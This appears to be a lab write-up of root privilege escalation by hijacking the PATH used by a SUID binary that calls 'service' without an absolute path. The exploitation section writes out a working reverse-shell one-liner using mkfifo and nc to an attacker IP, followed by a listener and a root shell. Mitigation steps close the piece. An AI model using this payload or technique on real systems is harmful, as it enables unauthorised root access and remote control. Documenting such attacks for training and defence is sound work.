
## Privilege Escalation – SUID Binary (PATH Hijacking)

##  Enumeration

SUID binaries on the system were enumerated:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
 Output:
```bash
-rwsr-sr-x 1 root staff /usr/local/bin/suid-env
```
##  Binary Analysis
* The binary was inspected for insecure command execution:

```bash
strings /usr/local/bin/suid-env
```
Observed Strings:
```bash
system
service apache2 start
```

* The binary calls service without using an absolute path
* When executed, it relies on the user's $PATH
* Since the binary runs with SUID root, this allows PATH hijacking

## Exploitation
Step 1: Create a malicious service script
```bash
echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.143.138 9001 > /tmp/f" > service
chmod +x service
```
This script establishes a reverse shell when executed.

Step 2: Modify the PATH environment variable
```bash
export PATH=/home/user:$PATH
```
Placing /home/user first ensures the malicious service script is executed.

Step 3: A Netcat listener was started on the attacker machine:
```bash
nc -lnvp 9001
```
Step 4: Execute the SUID binary
```bash
/usr/local/bin/suid-env
```
 Result
A reverse shell is received on the attacker machine:

```bash
sh-4.1# whoami
root
```
 Privilege escalation successful

## Mitigation

1.) Always use absolute paths in SUID binaries:
```bash
/usr/sbin/service
```
2.) sanitize and validate the $PATH environment variable

3.) Prefer static compilation for privileged binaries

4.) Remove unnecessary SUID permissions:
```bash
chmod u-s /usr/local/bin/suid-env
```
